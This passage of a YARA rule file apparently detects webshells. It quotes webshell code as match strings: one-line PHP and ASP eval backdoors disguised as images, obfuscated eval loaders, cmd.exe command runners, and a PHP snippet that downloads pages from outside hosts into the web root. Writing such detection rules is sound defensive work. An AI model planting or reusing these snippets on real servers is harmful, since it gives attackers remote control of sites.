        $s12 = "sub PrintPageFooter{print \"</font></body></html>\";}sub GetCookies{@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});foreach $cook" ascii
        $s13 = "$sth = $dbh->prepare(\"show columns from $table from $dbb\");$sth->execute;while ($ref = $sth->fetchrow_arrayref){$s4et++; sql_c" ascii
        $s14 = "&PrintCommandLineInputForm;&PrintPageFooter;}else{&PrintPageHeader(\"f\");file_header();print \"<code>Failed to download $FileUr" ascii
        $s15 = "$CommandTimeoutDuration = 10;# max time of command execution in console in seconds" fullword ascii
        $s16 = "if($RunCommand eq \"changedir\"){$RunCommand=\"cd $ChangeDir\";}elsif($RunCommand eq \"makedir\"){$RunCommand=\"mkdir $MkDir\";}" ascii
        $s17 = "ort=$Cookies{'pport'};$usser=$Cookies{'usser'};$passs=$Cookies{'passs'};$dbb=$Cookies{'dbb'};&PrintPageHeader(\"c\");" fullword ascii
        $s18 = "rrentDir) =~ m/[\\\\\\/]$/;$TargetFile .= $PathSep.$TransferFile;}if($Options eq \"go\"){&SendFileToBrowser($TargetFile);}else{" fullword ascii
        $s19 = "&SendFileToBrowser($TargetFile);}else{&PrintDownloadLinkPage($TargetFile);}}" fullword ascii
        $s20 = "sub sql_connect{sql_vars_set();sql_set_cookie();&PrintPageHeader(\"c\");sql_loginform();sql_vars_set();$s4et=0;$dbb=\"\";$dbh=DB" ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_71fef14c2a50911689643390934eb04aa48523e8
{
    meta:
        description = "others - file 71fef14c2a50911689643390934eb04aa48523e8.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "57ad723ce582df26c837f74248e5e8114df13c22375b404e220a41a12ae3f17a"
    strings:
        $s1 = "print \"#Coded by Ironfist (ironsecurity.nl) \\n\";" fullword ascii
        $s2 = "print \"#GIVES ERRORS WHEN CHECKING SUBFOLDERS: IGNORE THEM :) \\n\\n\\n\";" fullword ascii
        $s3 = "print \"#Usage: create a folder in your perlfolder and put the files to be scanned in it, next type the folder name below (eg my" ascii
        $s4 = "print \"#Usage: create a folder in your perlfolder and put the files to be scanned in it, next type the folder name below (eg my" ascii
        $s5 = "print \"\\n \\n#Will check a directory for all includes and unsets \\n\";" fullword ascii
        $s6 = "print \"Done! Check results.html for the found inclusions!\";" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 10KB and ( all of them ) ) or ( all of them )
}

rule bbb22a524c15339c519604455800cf9bc7c64e21
{
    meta:
        description = "others - file bbb22a524c15339c519604455800cf9bc7c64e21.ashx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ab1f08b822f94f256dc221a69b372a8371e5728282110b7119156ed8180476b1"
    strings:
        $s1 = "ctx.Response.Write(\"<form method='GET'>Command: <input name='cmd' value='\"+command+\"'><input type='submit' value='Run'></for" fullword ascii
        $s2 = "psi.FileName = \"cmd.exe\";" fullword ascii
        $s3 = "ctx.Response.Write(\"By <a href='http://www.twitter.com/Hypn'>@Hypn</a>, for educational purposes only.\");" fullword ascii
        $s4 = "/* command execution and output retrieval */" fullword ascii
        $s5 = "string command = HttpUtility.ParseQueryString(url.Query).Get(\"cmd\");" fullword ascii
        $s6 = "Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + \"://\" +   HttpContext.Current.Request.Url.Authority + HttpContext" fullword ascii
        $s7 = "psi.UseShellExecute = false;" fullword ascii
        $s8 = "ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));" fullword ascii
        $s9 = "public void ProcessRequest(HttpContext ctx)" fullword ascii
        $s10 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii
        $s11 = "ctx.Response.Write(\"<form method='GET'>Command: <input name='cmd' value='\"+command+\"'><input type='submit' value='Run'></form" ascii
        $s12 = "/* main executing code */" fullword ascii
        $s13 = "psi.Arguments = \"/c \"+command;" fullword ascii
        $s14 = "Process p = Process.Start(psi);" fullword ascii
        $s15 = "/* .Net requires this to be implemented */" fullword ascii
        $s16 = "using System.Web;" fullword ascii
        $s17 = "Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + \"://\" +   HttpContext.Current.Request.Url.Authority + HttpContext.C" ascii
        $s18 = "psi.RedirectStandardOutput = true;" fullword ascii
        $s19 = "get { return true; }" fullword ascii
        $s20 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule bc94da17033bf533b5cabe6490e01441c3b5e9d8
{
    meta:
        description = "others - file bc94da17033bf533b5cabe6490e01441c3b5e9d8.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5bbe3440af158ce74887fd27a442e662b45ef7640916e186a13da1665b1d88d4"
    strings:
        $s1 = "$HtmlMetaHeader=\"<meta HTTP-EQUIV=\\\"Refresh\\\" CONTENT=\\\"1; URL=$DownloadLink\\\">\";" fullword ascii
        $s2 = "if($Options eq \"go\"){&SendFileToBrowser($TargetFile);}else{&PrintDownloadLinkPage($TargetFile);}" fullword ascii
        $s3 = "elsif($Action eq \"command\"){&ExecuteCommand;}" fullword ascii
        $s4 = "sub PrintLoginFailedMessage{print \"<code>Login Failed,Wrong Password,Do You Want Try Again...  //BlackBap.Org</code>\";}" fullword ascii
        $s5 = "power by <a href=\"http://blackbap.org\" target=\"_blank\">Silic Group</a>" fullword ascii
        $s6 = "<div style=\"width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;\"><b>Login</b></div>" fullword ascii
        $s7 = "if(($WinNT & ($TransferFile =~ m/^\\\\|^.:/))|(!$WinNT & ($TransferFile =~ m/^\\//))){$TargetFile=$TransferFile;}" fullword ascii
        $s8 = "sub ExecuteCommand{" fullword ascii
        $s9 = "if($TransferFile eq \"\"){&PrintPageHeader(\"f\");&PrintFileDownloadForm;&PrintPageFooter;return;}" fullword ascii
        $s10 = "else{chop($TargetFile) if($TargetFile=$CurrentDir) =~ m/[\\\\\\/]$/;$TargetFile .= $PathSep.$TransferFile;}" fullword ascii
        $s11 = "<a href=\"$ScriptLocation?a=download&d=$EncodedCurrentDir\">&#25991;&#20214;&#19979;&#36733;</a> |" fullword ascii
        $s12 = "else{&PrintDownloadLinkPage($TargetFile);}" fullword ascii
        $s13 = "if($LoginPassword ne \"\"){&PrintLoginFailedMessage;}" fullword ascii
        $s14 = "&nbsp;&nbsp;<a href=\"$ScriptLocation?a=upload&d=$EncodedCurrentDir\">&#25991;&#20214;&#19978;&#20256;</a> | " fullword ascii
        $s15 = "if($TransferFile eq \"\"){&PrintPageHeader(\"f\");&PrintFileUploadForm;&PrintPageFooter;return;}" fullword ascii
        $s16 = "$Command=\"cd \\\"$CurrentDir\\\"\".$CmdSep.$RunCommand.$Redirector;" fullword ascii
        $s17 = "$MultipartFormData=$ENV{'CONTENT_TYPE'} =~ /multipart\\/form-data; boundary=(.+)$/;" fullword ascii
        $s18 = "sub GetCookies{@httpcookies=split(/; /,$ENV{'HTTP_COOKIE'});" fullword ascii
        $s19 = "chop($TargetName) if ($TargetName=$CurrentDir) =~ m/[\\\\\\/]$/;" fullword ascii
        $s20 = "if(!$WinNT){$SIG{'ALRM'}=\\&CommandTimeout;alarm($CommandTimeoutDuration);}" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule defc3e21bab59e2a2ab49f7eda99f65f83d4d349
{
    meta:
        description = "others - file defc3e21bab59e2a2ab49f7eda99f65f83d4d349.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d73a298660fb61fe9e3961a07be91d05971c64114204835bb99925c4fb5d1426"
    strings:
        $s1 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\WINDOWS\\system32\\stdole2.tlb#OLE Automation" fullword wide
        $s2 = "</A><A id=STAT_ONCLICK_UNSUBMIT_CATALOG_21 href=\"http://baike.baidu.com/view/4152.htm#7\" name=STAT_ONCLICK_UNSUBMIT_CATALOG>" fullword wide
        $s3 = "</A><A id=STAT_ONCLICK_UNSUBMIT_CATALOG_20 href=\"http://baike.baidu.com/view/4152.htm#6\" name=STAT_ONCLICK_UNSUBMIT_CATALOG>" fullword wide
        $s4 = "<A id=STAT_ONCLICK_UNSUBMIT_CATALOG_22 href=\"http://baike.baidu.com/view/4152.htm#8\" name=STAT_ONCLICK_UNSUBMIT_CATALOG>" fullword wide
        $s5 = "</A><A id=STAT_ONCLICK_UNSUBMIT_CATALOG_19 href=\"http://baike.baidu.com/view/4152.htm#5\" name=STAT_ONCLICK_UNSUBMIT_CATALOG>" fullword wide
        $s6 = "</A><A id=STAT_ONCLICK_UNSUBMIT_CATALOG_16 href=\"http://baike.baidu.com/view/4152.htm#2\" name=STAT_ONCLICK_UNSUBMIT_CATALOG>" fullword wide
        $s7 = "<P><IMG border=0 align=left src=\"http://www.bjljqx.com/UploadFiles/201312214359879.jpg\"></P>" fullword wide
        $s8 = "<P><IMG border=0 align=left src=\"http://www.bjljqx.com/UploadFiles/201312214359879.jpg\">" fullword wide
        $s9 = "<A href=\"http://www.bjljqx.com\"><FONT size=5>www.bjljqx.com</FONT></A></FONT></P><P><FONT size=5>" fullword wide
        $s10 = "LoginTimes(AdminPurview_Article\"AdminPurview_Soft$AdminPurview_Photo$AdminPurview_Guest&AdminPurview_Others" fullword wide
        $s11 = "*\\G{4AFFC9A0-5F99-101B-AF4E-00AA003F0F07}#9.0#0#G:\\office 2007\\Office12\\MSACC.OLB#Microsoft Access 12.0 Object Library" fullword wide
        $s12 = "<A style=\"PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; COLOR: rgb(103,103,10" wide
        $s13 = "</FONT><A href=\"http://www.bjljqx.com\"><FONT size=5>www.bjljqx.com</FONT></A></P>" fullword wide
        $s14 = "<A style=\"PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; COLOR: rgb(103,103,10" wide
        $s15 = "<P style=\"PADDING-BOTTOM: 0px; LINE-HEIGHT: 25px; LIST-STYLE-TYPE: none; TEXT-INDENT: 2em; MARGIN: 0px; PADDING-LEFT: 0px; PADD" wide
        $s16 = "000-0000-C000-000000000046}#4.0#9#C:\\Program Files\\Common Files\\Microsoft Shared\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applic" wide
        $s17 = "http://www.baoji.ganji.com" fullword ascii
        $s18 = "www.bjljqx.com</FONT></STRONG></DI<DIV><STRONG><FONT size=5>" fullword wide
        $s19 = "http://www.sohu.com" fullword ascii
        $s20 = "http://www.baidu.com" fullword ascii
    condition:
        ( uint16(0) == 0x0100 and filesize < 4000KB and ( 8 of them ) ) or ( all of them )
}

rule sig_5e7a49cec6029d2a68202160cd1876ef7887a029
{
    meta:
        description = "others - file 5e7a49cec6029d2a68202160cd1876ef7887a029.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "da1b34e9101e3c989bc05fd7c7fb3aba28f04b34b79c9f86f17109be78d6191b"
    strings:
        $s1 = "<?php ($b = $_POST['c']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b)', 'add');?>" fullword ascii
    condition:
        ( uint16(0) == 0xd8ff and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_72e5f0e4cd438e47b6454de297267770a36cbeb3
{
    meta:
        description = "others - file 72e5f0e4cd438e47b6454de297267770a36cbeb3.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1cd2344239867b8e98c79df7a39f59f567d131ff5445950c767f167523b4fdf1"
    strings:
        $s1 = "# displays a page that allows the user to run commands. If the password doens't" fullword ascii
        $s2 = "# an internal variable and is used each time a command has to be executed. The" fullword ascii
        $s3 = "$HtmlMetaHeader = \"<meta HTTP-EQUIV=\\\"Refresh\\\" CONTENT=\\\"1; URL=$DownloadLink\\\">\";" fullword ascii
        $s4 = "# CGI-Telnet Version 1.0 for NT and Unix : Run Commands on your Web Server" fullword ascii
        $s5 = "# get the directory in which the commands will be executed" fullword ascii
        $s6 = "# Main Program - Execution Starts Here" fullword ascii
        $s7 = "# Script Homepage: http://www.rohitab.com/cgiscripts/cgitelnet.html" fullword ascii
        $s8 = "# output of the change directory command is not displayed to the users" fullword ascii
        $s9 = "# This function is called to execute commands. It displays the output of the" fullword ascii
        $s10 = "# Product Support: http://www.rohitab.com/support/" fullword ascii
        $s11 = "# Configuration: You need to change only $Password and $WinNT. The other" fullword ascii
        $s12 = "# Author e-mail: rohitab@rohitab.com" fullword ascii
        $s13 = "# Author Homepage: http://www.rohitab.com/" fullword ascii
        $s14 = "# Prints the message that informs the user of a failed login" fullword ascii
        $s15 = "# 2. Change the password in the Configuration section below." fullword ascii
        $s16 = "# command and allows the user to enter another command. The change directory" fullword ascii
        $s17 = "<a href=\"http://www.rohitab.com/cgiscripts/cgitelnet.html\">Help</a>" fullword ascii
        $s18 = "&ExecuteCommand;" fullword ascii
        $s19 = "sub ExecuteCommand" fullword ascii
        $s20 = "# Discussion Forum: http://www.rohitab.com/discuss/" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 70KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4c65868f1abf46050cca65cff2b30ce8e8bb8356
{
    meta:
        description = "others - file 4c65868f1abf46050cca65cff2b30ce8e8bb8356.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "13406e0ac6ca95939dec8476a5c3413f2123f9f8acae7bf64431f41abd5b3401"
    strings:
        $s1 = "J<%eval request(\"keio\")%><%eval request(\"keio\")%><%eval request(\"keio\")%>" fullword ascii
    condition:
        ( uint16(0) == 0xd8ff and filesize < 10KB and ( all of them ) ) or ( all of them )
}

rule ce67c4f1984c377fce50a10cd426c31b138bc115
{
    meta:
        description = "others - file ce67c4f1984c377fce50a10cd426c31b138bc115.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e544a6156872fb1b39ff6846db216f11f8675f52684b299f5b87ce5b931dffeb"
    strings:
        $s1 = "$res = system (\"./exploit $hex\");" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_67f3b880b636b42d3379349b4b8102c2e0be40f2
{
    meta:
        description = "others - file 67f3b880b636b42d3379349b4b8102c2e0be40f2.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0a6e6bf0c9e30253f42122561377aa5b405c87f01381818d77c59c0928812869"
    strings:
        $s1 = "#            - old-wolf@zipmai.com" fullword ascii
        $s2 = "die \"ERROR: I could not fork() the process.\" unless defined($pid);" fullword ascii
        $s3 = "he \\\"I'm FUCKED!\\\" mode and fix up this thing...\\nTip: Find some shell and execute it ;)\\n\\n\");" fullword ascii
        $s4 = "my $SHELL       = \"/bin/bash\";             # shell to be executed" fullword ascii
        $s5 = "map { $cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{shell} eq $shell) } keys(%CLIENT);" fullword ascii
        $s6 = "# ******************* CONFIGURATION ******************** #" fullword ascii
        $s7 = "[\\033[1m\\]\\W\\[\\033[0m\\]\\[\\033[3;36m\\]]\\[\\033[0m\\]\\[\\033[1m:\\[\\033[0m\\] ';" fullword ascii
        $s8 = "return(eval(\"use $module $arg;\")) if (grep { -f \"$_/$file\" } @INC);" fullword ascii
        $s9 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);# || die \"erro: $!\";" fullword ascii
        $s10 = "#    0ldW0lf - oldwolf@atrixteam.net" fullword ascii
        $s11 = "my $PASS_PROMPT = \"Password: \";            # password prompt" fullword ascii
        $s12 = "#            - www.atrix.cjb.net" fullword ascii
        $s13 = "#            - www.atrixteam.net" fullword ascii
        $s14 = "my $PROC        = \"inetd\";                 # name of the process" fullword ascii
        $s15 = "my ($PTY, $TTY) = (*{\"pty.$cli\"}, *{\"tty.$cli\"}); # believe me old versions :/" fullword ascii
        $s16 = "#    warn \"set_raw: getattr($ttyno) failed: $!\";" fullword ascii
        $s17 = "$ENV{LS_OPTIONS} = ' --color=auto -F -b -T 0';" fullword ascii
        $s18 = "$ENV{LS_COLORS}  = 'no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.cmd=01;32:*.e" ascii
        $s19 = "{ exec(\"$SHELL\") };" fullword ascii
        $s20 = "open (STDIN, \"<&\".fileno($tty)) || die \"I could not reopen STDIN: $!\";" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule sig_84746a9144db4034defd2c558e6e5b954fd64548
{
    meta:
        description = "others - file 84746a9144db4034defd2c558e6e5b954fd64548.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "56f2c5e0322f193a5c775cdd7171936331209ba085c40ad41e05037864f8929c"
    strings:
        $x1 = "print LOG_FILE \" - $WEBACOO{rhost} - $WEBACOO{http_method} $WEBACOO{uri} - TOR - { $command } - { \";" fullword ascii
        $x2 = "$command = \"find $modargs[1] -type f -name .htaccess -exec ls -adl {} \\\\; 2>&1 | grep -v \\\"denied\\\"\";" fullword ascii
        $x3 = "print \"[!] If shell spawn at new URI failed, server config does not allow type overrides.\\n\";" fullword ascii
        $s4 = "$command = \"find $modargs[1] -user `whoami` -type d -perm /u+w 2>&1 | grep -v \\\"denied\\\" | head -1 \";" fullword ascii
        $s5 = "# Create credentials Postgres file to bypass interactive password authentication" fullword ascii
        $s6 = "print LOG_FILE \" - $WEBACOO{rhost} - $WEBACOO{http_method} $WEBACOO{uri} - \";" fullword ascii
        $s7 = "Single command execution mode (-t and -u are required)" fullword ascii
        $s8 = "# Log executed command" fullword ascii
        $s9 = "# Execute system command" fullword ascii
        $s10 = "# Command to be executed at target" fullword ascii
        $s11 = "$command = \"grep -q 'x-httpd-php .html' $wr_dir/.htaccess && exit; \"." fullword ascii
        $s12 = "$module_ext_head = \"psql -h $db_ip -p $db_port -U $modargs[3] -d $modargs[2] -t -q -c '\";" fullword ascii
        $s13 = "$command = \"find $modargs[1] -type d -perm /o+w 2>&1 | grep -v \\\"denied\\\" | head -1 \";" fullword ascii
        $s14 = "system(\"xxd -ps -r $lfile.tmp > $lfile\");" fullword ascii
        $s15 = "$module_ext_head = \"mysql -h $db_ip -P $db_port -u$modargs[2] -p$modargs[3] -e '\";" fullword ascii
        $s16 = "print LOG_FILE \" - { $command } - { \";" fullword ascii
        $s17 = "elsif($tool eq 'od') { $command = \"od -An -b -N 1000 -j $pivot $modargs[1]\"; }" fullword ascii
        $s18 = "$command=\"echo '*:*:*:*:$modargs[4]'> $output_str/.pgpass; chmod 600 $output_str/.pgpass\";" fullword ascii
        $s19 = "$command = 'php -r \\'echo \"File Uploads   :\";echo (ini_get(\"file_uploads\"))?\"ON\":\"OFF\";'." fullword ascii
        $s20 = "if($tool eq 'xxd') { $command = \"xxd -ps -l 1000 -s $pivot $modargs[1]\"; }" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule f58edc87f66a7078d4ccb2b4f1ff0c1d663554b2
{
    meta:
        description = "others - file f58edc87f66a7078d4ccb2b4f1ff0c1d663554b2.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "38b4f6ada23eea46019dd175da0225bb059bac6495236cb3f24caee2e8a42877"
    strings:
        $s1 = "# displays a page that allows the user to run commands. If the password doens't" fullword ascii
        $s2 = "# an internal variable and is used each time a command has to be executed. The" fullword ascii
        $s3 = "$HtmlMetaHeader = \"<meta HTTP-EQUIV=\\\"Refresh\\\" CONTENT=\\\"1; URL=$DownloadLink\\\">\";" fullword ascii
        $s4 = "# CGI-Telnet Version 1.0 for NT and Unix : Run Commands on your Web Server" fullword ascii
        $s5 = "# get the directory in which the commands will be executed" fullword ascii
        $s6 = "# Main Program - Execution Starts Here" fullword ascii
        $s7 = "# Script Homepage: http://www.rohitab.com/cgiscripts/cgitelnet.html" fullword ascii
        $s8 = "# output of the change directory command is not displayed to the users" fullword ascii
        $s9 = "# This function is called to execute commands. It displays the output of the" fullword ascii
        $s10 = "# Product Support: http://www.rohitab.com/support/" fullword ascii
        $s11 = "# Configuration: You need to change only $Password and $WinNT. The other" fullword ascii
        $s12 = "# Author e-mail: rohitab@rohitab.com" fullword ascii
        $s13 = "# Author Homepage: http://www.rohitab.com/" fullword ascii
        $s14 = "# Prints the message that informs the user of a failed login" fullword ascii
        $s15 = "# 2. Change the password in the Configuration section below." fullword ascii
        $s16 = "# command and allows the user to enter another command. The change directory" fullword ascii
        $s17 = "<a href=\"http://www.rohitab.com/cgiscripts/cgitelnet.html\">Help</a>" fullword ascii
        $s18 = "&ExecuteCommand;" fullword ascii
        $s19 = "sub ExecuteCommand" fullword ascii
        $s20 = "# Discussion Forum: http://www.rohitab.com/discuss/" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 70KB and ( 8 of them ) ) or ( all of them )
}

rule bb9f82930f273fe5ea001f2d0481e07b9ca08cff
{
    meta:
        description = "others - file bb9f82930f273fe5ea001f2d0481e07b9ca08cff.soap"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a13cbf03be78b855d6bb3abc537a9a51d7eadb172c4e144de31dc0b4ef0f87f5"
    strings:
        $s1 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyyy-MM-dd hh:mm:ss\"));" fullword ascii
        $s2 = "R = \"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";" fullword ascii
        $s3 = "R += String.Format(\"{0}\\t{1}\\t{2}\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yy" fullword ascii
        $s4 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyy" fullword ascii
        $s5 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == 0)" fullword ascii
        $s6 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == " fullword ascii
        $s7 = "cm.ExecuteNonQuery();" fullword ascii
        $s8 = "ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2));" fullword ascii
        $s9 = "c.UseShellExecute = false;" fullword ascii
        $s10 = "[WebService(Namespace = \"http://www.wooyun.org/whitehats/RedFree\")]" fullword ascii
        $s11 = "HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();" fullword ascii
        $s12 = "SqlCommand cm = Conn.CreateCommand();" fullword ascii
        $s13 = "cm.CommandText = Z2;" fullword ascii
        $s14 = "Process e = new Process();" fullword ascii
        $s15 = "File.Copy(S + \"\\\\\" + F.Name, D + \"\\\\\" + F.Name);" fullword ascii
        $s16 = "[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]" fullword ascii
        $s17 = "R = Conn.Database + \"\\t\";" fullword ascii
        $s18 = "using System.Web.Services.Protocols;" fullword ascii
        $s19 = "DataTable dt = Conn.GetSchema(\"Columns\");" fullword ascii
        $s20 = "DataTable dt = Conn.GetSchema(\"Columns\", p);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_others_Gass
{
    meta:
        description = "others - file Gass.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5681b56de8cacf80a4eb3b2be449523950481440407a4d9cff178ea18fed91d8"
    strings:
        $s1 = "$text = http_get('https://ghostbin.com/paste/vm4rz/raw');" fullword ascii
        $s2 = "$text0 = http_get('http://fallagassrini.xx.tn//un.txt');" fullword ascii
        $s3 = "$text2 = http_get('http://fallagassrini.xx.tn//7.txt');" fullword ascii
        $s4 = "$check5=$_SERVER['DOCUMENT_ROOT'] . \"/wp-content/uploads/index.html\" ;" fullword ascii
        $s5 = "$text3 = http_get('http://fallagassrini.xx.tn/index.html');" fullword ascii
        $s6 = "$text5 = http_get('http://fallagassrini.xx.tn/index.html');" fullword ascii
        $s7 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/xGSx.php\" ;" fullword ascii
        $s8 = "$check0 = $_SERVER['DOCUMENT_ROOT'] . \"/un.php\" ;" fullword ascii
        $s9 = "$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/7.php\" ;" fullword ascii
        $s10 = "function http_get($url){" fullword ascii
        $s11 = "return curl_exec($im);" fullword ascii
        $s12 = "$check3=$_SERVER['DOCUMENT_ROOT'] . \"/Gass.html\" ;" fullword ascii
        $s13 = "curl_setopt($im, CURLOPT_HEADER, 0);" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule e6dcaf6a6a60c921e58dd0f5610822a3ca9b7aa6
{
    meta:
        description = "others - file e6dcaf6a6a60c921e58dd0f5610822a3ca9b7aa6.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e2ed30987e8a15c758add792a6e4718589a1cd2eb5c07c95a6a7abbb72a47026"
    strings:
        $s1 = "'.'_'.'P'.'O'.'S'.'T'.'[$'.'X'.']'.');');@$__('/*'.'^'.'_'.'^'.'*/');die(header('HTTP/1.0 404 Not Found'));?>" fullword ascii
        $s2 = ";/*  |xGv00|ba7bfb7bc90d253376674b000cea51e1 */<?php $_='Cr'.'eat'.'e_F'.'unc'.'tion';$__=@$_('$'.'X','@'.'E'.'v'.'a'.'l'.'('.'$" ascii
    condition:
        ( uint16(0) == 0x4947 and filesize < 3KB and ( all of them ) ) or ( all of them )
}

rule b3c91097561d1aab7424db83dd8b9ab1422bc9d9
{
    meta:
        description = "others - file b3c91097561d1aab7424db83dd8b9ab1422bc9d9.ashx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a2a1b810ba69fc360b12adec75b69c4987c80f1e7dcf1a42e59c19f666709c22"
    strings:
        $s1 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyyy-MM-dd hh:mm:ss\")); " fullword ascii
        $s2 = "R = \"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\"; " fullword ascii
        $s3 = "R += String.Format(\"{0}\\t{1}\\t{2}\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yy" fullword ascii
        $s4 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyy" fullword ascii
        $s5 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == " fullword ascii
        $s6 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == 0) " fullword ascii
        $s7 = "public void ProcessRequest(HttpContext context) " fullword ascii
        $s8 = "cm.ExecuteNonQuery(); " fullword ascii
        $s9 = "ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2)); " fullword ascii
        $s10 = "c.UseShellExecute = false; " fullword ascii
        $s11 = "HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse(); " fullword ascii
        $s12 = "cm.CommandText = Z2; " fullword ascii
        $s13 = "SqlCommand cm = Conn.CreateCommand(); " fullword ascii
        $s14 = "Process e = new Process(); " fullword ascii
        $s15 = "R = Conn.Database + \"\\t\"; " fullword ascii
        $s16 = "DataTable dt = Conn.GetSchema(\"Columns\", p); " fullword ascii
        $s17 = "DataTable dt = Conn.GetSchema(\"Columns\"); " fullword ascii
        $s18 = "R += String.Format(\"{0}\\t{1}\\t{2}\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyyy-MM-dd hh:mm:ss\"), D.L" ascii
        $s19 = "HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(Z1)); " fullword ascii
        $s20 = "context.Response.Write(\"\\x2D\\x3E\\x7C\"+R+\"\\x7C\\x3C\\x2D\"); " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule sig_3610fffd9262dae60e57703b7a2aab8cdcdb98aa
{
    meta:
        description = "others - file 3610fffd9262dae60e57703b7a2aab8cdcdb98aa.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8f2ebda4d0ce8f8ca9e4003a4b4f63d641051af87dcbcdc05f86f64ce047c49b"
    strings:
        $s1 = "# displays a page that allows the user to run commands. If the password doens't" fullword ascii
